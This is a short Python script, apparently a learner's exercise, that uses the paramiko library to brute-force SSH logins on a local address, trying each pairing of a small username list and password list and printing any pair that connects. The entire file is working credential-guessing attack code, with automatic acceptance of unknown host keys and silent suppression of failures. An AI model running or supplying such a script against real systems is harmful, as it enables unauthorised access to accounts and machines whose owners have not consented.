import paramiko
client=paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
username_list=["admin","hasan"]
password_list=["password","hasan"]
for i in username_list:
    for j in password_list:
        try:
            sonuc=client.connect("192.168.1.15",username=i,password=j)
            client.close()
            print("Username:",i,"Password:",j)
        except:
            pass
